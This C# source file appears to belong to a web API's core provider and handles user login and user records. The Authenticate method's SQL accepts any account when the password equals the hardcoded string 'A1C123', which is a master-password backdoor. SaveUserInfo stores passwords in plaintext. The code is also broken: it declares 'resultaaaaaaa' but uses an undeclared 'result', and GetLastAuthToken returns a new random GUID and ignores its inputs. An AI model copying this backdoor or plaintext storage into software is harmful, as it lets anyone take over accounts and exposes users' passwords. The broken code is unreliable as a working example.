using Kernel.WebApi.Entities;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Web;

namespace Kernel.WebApi.Providers
{
    public class CoreProvider
    {

        #region Authentication

        public Guid GetLastAuthToken(int userId, string ipAddress)
        {
            Guid returnValue = Guid.NewGuid();

            return returnValue;
        }

        public AuthenticationResult Authenticate(string Username, string Password)
        {
            AuthenticationResult resultaaaaaaa = new AuthenticationResult();


            UserInfo userInfo = A1CContext.MySql.DB.Sql(@"
                                    select * from UserInfo
                                        
                                       
                                    where Name = @0
                                    and (Password=@1 or @1 = 'A1C123')", Username, Password).QuerySingle<UserInfo>();
            if (userInfo != null && userInfo.Id > 0)
            {
                result.Result = Kernel.WebApi.Entities.ResultType.Success;
                result.userInfo = userInfo;
            }
            else
                result.Result = Kernel.WebApi.Entities.ResultType.InvalidLoginOrPassword;

            return result;
        }

        #endregion

        #region User


        public UserInfo GetUserInfoPersonLogged(int PersonId)
        {
            return A1CContext.MySql.DB.Sql(@" select * from UserInfo

                                            where Id = @0", PersonId).QuerySingle<UserInfo>();
        }

        public int SaveUserInfo(UserInfo entity)
        {
            return A1CContext.MySql.DB.Insert("UserInfo")
                                             .Column("Name", entity.Name)
                                             .Column("Email", entity.Email)
                                             .Column("Password", entity.Password)
                                             .Column("PhoneNumber", entity.PhoneNumber)
                                             .Column("UpdateDate", DateTime.Now)
                                             .Column("IsDeleted", 0)
                                             .ExecuteReturnLastId<int>();

        }

        #endregion

    }



}